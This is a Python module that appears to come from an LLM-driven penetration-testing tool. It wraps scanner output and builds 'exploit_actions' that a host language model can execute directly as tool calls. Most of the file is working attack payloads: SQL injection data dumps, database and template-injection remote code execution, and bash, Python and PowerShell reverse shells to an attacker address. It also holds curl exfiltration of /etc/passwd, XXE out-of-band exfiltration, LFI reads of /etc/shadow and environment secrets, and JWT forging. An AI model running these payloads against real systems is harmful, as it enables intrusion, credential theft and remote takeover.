"""Standard response envelope for scanner outputs.

All scanner results can use ``wrap_result()`` to produce consistent output
that helps the host LLM parse results quickly.  Includes an *exploit_actions*
engine that generates ready-to-execute tool calls for confirmed vulnerabilities.
"""

from __future__ import annotations

import time
from typing import Any

# Maps vulnerability types to recommended follow-up actions.
_NEXT_STEPS: dict[str, list[str]] = {
    "sql_injection": [
        "Run injection_test with types=sql on related endpoints",
        "Use http_request for UNION extraction (ORDER BY -> string column -> schema -> data)",
        "Check plan(action='chain') for SQLi->credential dump->privilege escalation",
    ],
    "xss": [
        "Test stored XSS on write endpoints (feedback, reviews, profiles)",
        "Check for DOM XSS on SPA hash routes via js_analyze",
        "Chain with CSRF for session hijacking",
    ],
    "nosql_injection": [
        "Test with different NoSQL operators ($gt, $ne, $regex)",
        "Extract data via boolean-based enumeration with http_request",
    ],
    "ssti": [
        "Identify template engine via kb_search(query='ssti identification')",
        "Escalate to RCE with engine-specific payloads",
    ],
    "command_injection": [
        "Confirm with out-of-band via oob(action='setup') + blind payload",
        "Escalate to reverse shell or data exfiltration",
    ],
    "idor": [
        "Test adjacent IDs (+1/-1) on the same endpoint",
        "Test other resource endpoints with the same pattern",
        "Chain with auth_test to verify JWT-based access control",
    ],
    "csrf": [
        "Chain with XSS for automated CSRF exploitation",
        "Test state-changing endpoints: password change, email update, transfers",
    ],
    "cors": [
        "Verify if credentials are exposed (Access-Control-Allow-Credentials: true)",
        "Chain with XSS for cross-origin data theft",
    ],
    "ssrf": [
        "Probe cloud metadata: 169.254.169.254/latest/meta-data/iam/",
        "Test internal service discovery on common ports",
    ],
    "lfi": [
        "Escalate with null byte bypass, double encoding, php://filter wrappers",
        "Chain LFI->log poisoning->RCE via access log injection",
    ],
    "xxe": [
        "Test blind XXE with oob(action='setup') for out-of-band exfiltration",
        "Extract sensitive files: /etc/passwd, application config, credentials",
    ],
    "auth_bypass": [
        "Capture session token and run plan(action='post_auth')",
        "Test all authenticated endpoints with obtained token",
    ],
    "jwt_weak": [
        "Forge admin token with cracked secret or alg:none",
        "Run access_control_test with forged token for privilege escalation",
    ],
    "open_redirect": [
        "Chain with OAuth flows for token theft",
        "Test for SSRF via redirect parameter",
    ],
}

_GENERIC_NEXT_STEPS = [
    "Save confirmed findings with save_finding()",
    "Check plan(action='chain') for escalation opportunities",
]

# ---------------------------------------------------------------------------
# Exploit Actions Engine
# ---------------------------------------------------------------------------
# Structured payloads the host LLM can feed directly into http_request,
# run_command, or oob tools.  Every entry is a dict with:
#   action     – human-readable label
#   tool       – MCP tool to invoke
#   description – why this matters
#   args       – arguments to pass to the tool (may contain {placeholders})
# ---------------------------------------------------------------------------

# -- SQLi: DBMS-specific UNION / stacked extraction  -----------------------

def _sqli_nulls(col_count: int, inject_col: int, expr: str) -> str:
    """Build a UNION SELECT column list with *expr* in position *inject_col*."""
    cols = ["NULL"] * max(col_count, 1)
    cols[min(inject_col, len(cols) - 1)] = expr
    return ",".join(cols)


_SQLI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
    "mysql": [
        {
            "action": "extract_schema",
            "tool": "http_request",
            "description": "Enumerate MySQL tables via information_schema",
            "payload": "UNION SELECT {nulls_with_expr} FROM information_schema.tables WHERE table_schema=database()-- -",
            "expr": "GROUP_CONCAT(table_name SEPARATOR ',')",
        },
        {
            "action": "extract_columns",
            "tool": "http_request",
            "description": "Extract column names for a given table",
            "payload": (
                "UNION SELECT {nulls_with_expr} FROM information_schema.columns "
                "WHERE table_schema=database() AND table_name='{table}'-- -"
            ),
            "expr": "GROUP_CONCAT(column_name SEPARATOR ',')",
        },
        {
            "action": "extract_data",
            "tool": "http_request",
            "description": "Dump rows from target table",
            "payload": "UNION SELECT {nulls_with_expr} FROM {table}-- -",
            "expr": "GROUP_CONCAT({column} SEPARATOR ',')",
        },
        {
            "action": "read_file",
            "tool": "http_request",
            "description": "Read a server file via LOAD_FILE()",
            "payload": "UNION SELECT {nulls_with_expr} FROM dual-- -",
            "expr": "LOAD_FILE('/etc/passwd')",
        },
    ],
    "postgresql": [
        {
            "action": "extract_schema",
            "tool": "http_request",
            "description": "Enumerate PostgreSQL tables",
            "payload": (
                "UNION SELECT {nulls_with_expr} FROM information_schema.tables "
                "WHERE table_schema='public'-- -"
            ),
            "expr": "string_agg(table_name,',')",
        },
        {
            "action": "extract_columns",
            "tool": "http_request",
            "description": "Extract columns for a table",
            "payload": (
                "UNION SELECT {nulls_with_expr} FROM information_schema.columns "
                "WHERE table_name='{table}'-- -"
            ),
            "expr": "string_agg(column_name,',')",
        },
        {
            "action": "extract_data",
            "tool": "http_request",
            "description": "Dump rows",
            "payload": "UNION SELECT {nulls_with_expr} FROM {table}-- -",
            "expr": "string_agg({column}::text,',')",
        },
        {
            "action": "rce_copy",
            "tool": "http_request",
            "description": "Attempt command execution via COPY ... PROGRAM (superuser)",
            "payload": "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';-- -",
        },
    ],
    "sqlite": [
        {
            "action": "extract_schema",
            "tool": "http_request",
            "description": "Enumerate SQLite tables",
            "payload": "UNION SELECT {nulls_with_expr} FROM sqlite_master WHERE type='table'-- -",
            "expr": "GROUP_CONCAT(name,',')",
        },
        {
            "action": "extract_columns",
            "tool": "http_request",
            "description": "Get table info via pragma (embed in subquery)",
            "payload": "UNION SELECT {nulls_with_expr} FROM pragma_table_info('{table}')-- -",
            "expr": "GROUP_CONCAT(name,',')",
        },
        {
            "action": "extract_data",
            "tool": "http_request",
            "description": "Dump rows",
            "payload": "UNION SELECT {nulls_with_expr} FROM {table}-- -",
            "expr": "GROUP_CONCAT({column},',')",
        },
    ],
    "mssql": [
        {
            "action": "extract_schema",
            "tool": "http_request",
            "description": "Enumerate MSSQL tables",
            "payload": "UNION SELECT {nulls_with_expr} FROM information_schema.tables-- -",
            "expr": "STRING_AGG(table_name,',')",
        },
        {
            "action": "rce_xp_cmdshell",
            "tool": "http_request",
            "description": "Attempt xp_cmdshell RCE (sa privileges required)",
            "payload": "'; EXEC xp_cmdshell 'whoami';-- -",
        },
    ],
    "oracle": [
        {
            "action": "extract_schema",
            "tool": "http_request",
            "description": "Enumerate Oracle tables",
            "payload": "UNION SELECT {nulls_with_expr} FROM all_tables WHERE ROWNUM<=50-- -",
            "expr": "LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)",
        },
    ],
}

# -- SSTI: engine-specific RCE payloads ------------------------------------

_SSTI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
    "jinja2": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Jinja2 SSTI → RCE via __subclasses__",
            "payload": (
                "{{''.__class__.__mro__[1].__subclasses__()[408]"
                "('id',shell=True,stdout=-1).communicate()[0]}}"
            ),
        },
        {
            "action": "rce_lipsum",
            "tool": "http_request",
            "description": "Jinja2 SSTI → RCE via lipsum (WAF bypass)",
            "payload": "{{lipsum.__globals__['os'].popen('id').read()}}",
        },
    ],
    "twig": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Twig SSTI → RCE",
            "payload": "{{['id']|filter('system')}}",
        },
    ],
    "mako": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Mako SSTI → RCE via import",
            "payload": "${__import__('os').popen('id').read()}",
        },
    ],
    "freemarker": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "FreeMarker SSTI → RCE",
            "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        },
    ],
    "smarty": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Smarty SSTI → RCE",
            "payload": "{system('id')}",
        },
    ],
    "erb": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "ERB SSTI → RCE",
            "payload": "<%= system('id') %>",
        },
    ],
    "velocity": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Velocity SSTI → RCE",
            "payload": '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end',
        },
    ],
    "pebble": [
        {
            "action": "rce",
            "tool": "http_request",
            "description": "Pebble SSTI → RCE",
            "payload": '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName("java.lang.String").constructors[0].newInstance(([bytes, "UTF-8"] | type("java.lang.Object[]"))) }}',
        },
    ],
}

# -- Command Injection: reverse shells ------------------------------------

_CMDI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
    "unix": [
        {
            "action": "reverse_shell_bash",
            "tool": "run_command",
            "description": "Bash reverse shell (set up listener with: nc -lvnp {port})",
            "payload": ";bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1",
        },
        {
            "action": "reverse_shell_python",
            "tool": "run_command",
            "description": "Python reverse shell",
            "payload": (
                ";python3 -c 'import socket,subprocess,os;"
                "s=socket.socket();s.connect((\"{attacker_ip}\",{port}));"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
        },
        {
            "action": "data_exfil",
            "tool": "http_request",
            "description": "Exfiltrate data via curl to attacker-controlled server",
            "payload": ";curl http://{attacker_ip}:{port}/exfil?data=$(cat /etc/passwd | base64 -w0)",
        },
    ],
    "windows": [
        {
            "action": "reverse_shell_powershell",
            "tool": "run_command",
            "description": "PowerShell reverse shell",
            "payload": (
                '& powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{attacker_ip}\',{port});'
                "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                'while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);'
                "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                "$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
                '"'
            ),
        },
    ],
}

# -- XXE: OOB exfiltration / escalation ------------------------------------

_XXE_EXPLOIT: list[dict[str, Any]] = [
    {
        "action": "oob_exfil",
        "tool": "oob",
        "description": "Blind XXE via OOB parameter entity — exfiltrate /etc/passwd",
        "payload": (
            '<?xml version="1.0"?>'
            "<!DOCTYPE foo ["
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '<!ENTITY % dtd SYSTEM "http://{attacker_ip}:{port}/evil.dtd">'
            "%dtd;%send;"
            "]><foo>&xxe;</foo>"
        ),
        "dtd_content": (
            '<!ENTITY % send SYSTEM "http://{attacker_ip}:{port}/collect?data=%xxe;">'
        ),
    },
    {
        "action": "read_file",
        "tool": "http_request",
        "description": "Read /etc/hostname via XXE direct entity",
        "payload": (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/hostname">'
            "]><foo>&xxe;</foo>"
        ),
    },
    {
        "action": "ssrf_cloud_metadata",
        "tool": "http_request",
        "description": "XXE → SSRF to cloud metadata endpoint",
        "payload": (
            '<?xml version="1.0"?><!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
            "]><foo>&xxe;</foo>"
        ),
    },
]

# -- LFI: escalation paths -------------------------------------------------

_LFI_EXPLOIT: dict[str, list[dict[str, Any]]] = {
    "linux": [
        {
            "action": "read_passwd",
            "tool": "http_request",
            "description": "Read /etc/passwd to enumerate users",
            "payload": "....//....//....//....//etc/passwd",
        },
        {
            "action": "read_shadow",
            "tool": "http_request",
            "description": "Attempt /etc/shadow (requires elevated privileges)",
            "payload": "....//....//....//....//etc/shadow",
        },
        {
            "action": "log_poison_rce",
            "tool": "http_request",
            "description": "LFI → Log poisoning RCE: inject PHP into access log, then include it",
            "steps": [
                "1. Send request with User-Agent: <?php system($_GET['cmd']); ?>",
                "2. Include the log: ....//....//....//var/log/apache2/access.log&cmd=id",
            ],
            "payload": "....//....//....//....//var/log/apache2/access.log",
        },
        {
            "action": "proc_self",
            "tool": "http_request",
            "description": "Read /proc/self/environ for secrets in environment variables",
            "payload": "....//....//....//....//proc/self/environ",
        },
    ],
    "windows": [
        {
            "action": "read_hosts",
            "tool": "http_request",
            "description": "Read Windows hosts file",
            "payload": "....\\....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
        },
        {
            "action": "read_ini",
            "tool": "http_request",
            "description": "Read php.ini for configuration details",
            "payload": "....\\....\\....\\....\\xampp\\php\\php.ini",
        },
    ],
    "php": [
        {
            "action": "php_filter_rce",
            "tool": "http_request",
            "description": "PHP filter wrapper to read source code as base64",
            "payload": "php://filter/convert.base64-encode/resource={target_file}",
        },
        {
            "action": "php_input_rce",
            "tool": "http_request",
            "description": "PHP input wrapper → RCE (POST body becomes PHP code)",
            "payload": "php://input",
            "body": "<?php system('id'); ?>",
        },
        {
            "action": "php_data_rce",
            "tool": "http_request",
            "description": "PHP data wrapper → RCE",
            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
        },
    ],
}

# -- Auth: chaining actions for post-auth exploitation ----------------------

_AUTH_EXPLOIT: dict[str, list[dict[str, Any]]] = {
    "jwt_none_alg": [
        {
            "action": "forge_admin",
            "tool": "http_request",
            "description": "Forge admin JWT by changing role/sub claim (alg:none allows unsigned tokens)",
        },
        {
            "action": "access_control_scan",
            "tool": "access_control_test",
            "description": "Test all endpoints with forged admin token",
        },
    ],
    "jwt_weak_secret": [
        {
            "action": "forge_admin",
            "tool": "http_request",
            "description": "Re-sign JWT with admin claims using cracked secret",
        },
        {
            "action": "access_control_scan",
            "tool": "access_control_test",
            "description": "Test privilege escalation with forged token",
        },
    ],
    "jwt_kid_injection": [
        {
            "action": "forge_admin",
            "tool": "http_request",
            "description": "Forge JWT with kid pointing to /dev/null (sign with empty key)",
        },
    ],
    "default_credentials": [
        {
            "action": "post_auth_plan",
            "tool": "plan",
            "description": "Generate post-authentication test plan using obtained session",
            "args": {"action": "post_auth"},
        },
        {
            "action": "authenticated_scan",
            "tool": "injection_test",
            "description": "Run injection tests on authenticated endpoints",
        },
    ],
}


# ---------------------------------------------------------------------------
# Exploit action builder
# ---------------------------------------------------------------------------

def _build_exploit_actions(target: str, vulns: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Generate structured exploit actions from confirmed vulnerabilities.

    Each action is a dict the host LLM can translate directly into an MCP
    tool call.  The output intentionally includes placeholders like
    ``{attacker_ip}`` that the LLM should substitute before execution.
    """
    actions: list[dict[str, Any]] = []

    for v in vulns:
        vtype = str(v.get("type", "")).lower()
        confidence = v.get("confidence", 0.5)
        if confidence < 0.5:
            continue  # skip low-confidence detections

        if vtype == "sql_injection":
            dbms = str(v.get("dbms", "mysql")).lower()
            col_count = int(v.get("column_count", 0))
            param = v.get("param", "")
            technique = str(v.get("technique", "")).lower()
            templates = _SQLI_EXPLOIT.get(dbms, _SQLI_EXPLOIT.get("mysql", []))

            if col_count > 0 and "union" in technique:
                for tmpl in templates:
                    action = {
                        "action": tmpl["action"],
                        "tool": tmpl["tool"],
                        "description": tmpl["description"],
                        "dbms": dbms,
                        "column_count": col_count,
                    }
                    expr = tmpl.get("expr", "@@version")
                    nulls = _sqli_nulls(col_count, 1, expr)
                    action["payload"] = tmpl["payload"].format(
                        nulls_with_expr=nulls, table="{table}", column="{column}"
                    )
                    action["param"] = param
                    actions.append(action)
            else:
                # Blind / error-based — suggest stacked or conditional payloads
                actions.append({
                    "action": "blind_extract",
                    "tool": "http_request",
                    "description": f"Blind {dbms} SQLi — use conditional responses to extract data",
                    "dbms": dbms,
                    "technique": technique,
                    "param": param,
                    "payload": v.get("payload", ""),
                    "hint": "Use binary search with SUBSTRING/ASCII for efficient blind extraction",
                })

        elif vtype == "ssti":
            engine = str(v.get("engine", "")).lower()
            templates = _SSTI_EXPLOIT.get(engine, [])
            for tmpl in templates:
                action = {
                    "action": tmpl["action"],
                    "tool": tmpl["tool"],
                    "description": tmpl["description"],
                    "engine": engine,
                    "payload": tmpl["payload"],
                    "param": v.get("param", ""),
                    "location": v.get("location", ""),
                }
                actions.append(action)

        elif vtype == "command_injection":
            platform = str(v.get("platform", "unix")).lower()
            platform = "windows" if "win" in platform else "unix"
            templates = _CMDI_EXPLOIT.get(platform, _CMDI_EXPLOIT["unix"])
            for tmpl in templates:
                actions.append({
                    "action": tmpl["action"],
                    "tool": tmpl["tool"],
                    "description": tmpl["description"],
                    "platform": platform,
                    "payload": tmpl["payload"],
                    "param": v.get("param", ""),
                    "note": "Replace {attacker_ip} and {port} with your listener address",
                })

        elif vtype == "xxe":
            for tmpl in _XXE_EXPLOIT:
                action = {
                    "action": tmpl["action"],
                    "tool": tmpl["tool"],
                    "description": tmpl["description"],
                    "payload": tmpl["payload"],
                    "endpoint": v.get("endpoint", ""),
                }
                if "dtd_content" in tmpl:
                    action["dtd_content"] = tmpl["dtd_content"]
                actions.append(action)

        elif vtype == "lfi":
            platform = str(v.get("platform", "linux")).lower()
            # Always include generic linux paths
            for p in ("linux", "php"):
                for tmpl in _LFI_EXPLOIT.get(p, []):
                    action = {
                        "action": tmpl["action"],
                        "tool": tmpl["tool"],
                        "description": tmpl["description"],
                        "payload": tmpl["payload"],
                        "param": v.get("param", ""),
                    }
                    if "steps" in tmpl:
                        action["steps"] = tmpl["steps"]
                    if "body" in tmpl:
                        action["body"] = tmpl["body"]
                    actions.append(action)
            if "win" in platform:
                for tmpl in _LFI_EXPLOIT.get("windows", []):
                    actions.append({
                        "action": tmpl["action"],
                        "tool": tmpl["tool"],
                        "description": tmpl["description"],
                        "payload": tmpl["payload"],
                        "param": v.get("param", ""),
                    })

        elif vtype in _AUTH_EXPLOIT:
            forged = v.get("forged_token", "")
            for tmpl in _AUTH_EXPLOIT[vtype]:
                action = {
                    "action": tmpl["action"],
                    "tool": tmpl["tool"],
                    "description": tmpl["description"],
                }
                if forged:
                    action["forged_token"] = forged
                if "args" in tmpl:
                    action["args"] = tmpl["args"]
                actions.append(action)

    return actions


def _build_summary(tool: str, target: str, vulns: list[dict[str, Any]]) -> str:
    """Build a one-line summary from findings."""
    if not vulns:
        return f"No vulnerabilities found on {target}"

    count = len(vulns)
    types = set()
    max_severity = "info"
    severity_order = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}

    for v in vulns:
        vtype = v.get("type", v.get("subtype", "unknown"))
        types.add(vtype)
        sev = str(v.get("severity", "info")).lower()
        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
            max_severity = sev

    type_str = ", ".join(sorted(types)[:3])
    if len(types) > 3:
        type_str += f" +{len(types) - 3} more"

    return f"{count} vuln(s) found ({type_str}), max severity: {max_severity}"


def _build_next_steps(vulns: list[dict[str, Any]]) -> list[str]:
    """Build next_steps from vulnerability types found."""
    if not vulns:
        return []

    steps: list[str] = []
    seen_types: set[str] = set()

    for v in vulns:
        vtype = str(v.get("type", v.get("subtype", ""))).lower().replace("-", "_").replace(" ", "_")
        if vtype in seen_types:
            continue
        seen_types.add(vtype)

        # Try exact match, then partial match
        matched = _NEXT_STEPS.get(vtype)
        if not matched:
            for key, val in _NEXT_STEPS.items():
                if key in vtype or vtype in key:
                    matched = val
                    break

        if matched:
            steps.extend(matched)

    if not steps:
        steps = list(_GENERIC_NEXT_STEPS)

    # Deduplicate preserving order
    seen: set[str] = set()
    unique: list[str] = []
    for s in steps:
        if s not in seen:
            seen.add(s)
            unique.append(s)

    return unique[:5]  # Cap at 5 to avoid bloat


def wrap_result(
    tool: str,
    target: str,
    result: dict[str, Any],
    start_time: float | None = None,
) -> dict[str, Any]:
    """Wrap a scanner result dict in a standard envelope.

    Adds: status, tool, target, duration_ms, summary, next_steps fields.
    Preserves all existing fields from result.

    Args:
        tool: Tool name (e.g., "injection_test", "xss_test").
        target: Target URL that was scanned.
        result: Raw result dict from scanner.
        start_time: monotonic start time for duration calculation.
    """
    vulns = result.get("vulnerabilities", result.get("findings", []))
    has_error = "error" in result

    envelope: dict[str, Any] = {
        "status": "error" if has_error else ("ok" if not vulns else "findings"),
        "tool": tool,
        "target": target,
    }

    if start_time is not None:
        envelope["duration_ms"] = round((time.monotonic() - start_time) * 1000, 1)

    # Merge all result fields (result fields take precedence)
    envelope.update(result)

    # Add summary and next_steps (don't override if result already has them)
    if "summary" not in envelope:
        envelope["summary"] = _build_summary(tool, target, vulns) if not has_error else result.get("error", "Error")
    if "next_steps" not in envelope:
        envelope["next_steps"] = _build_next_steps(vulns)

    # Add exploit_actions for confirmed vulnerabilities
    if vulns and not has_error:
        exploit_actions = _build_exploit_actions(target, vulns)
        if exploit_actions:
            envelope["exploit_actions"] = exploit_actions

    return envelope
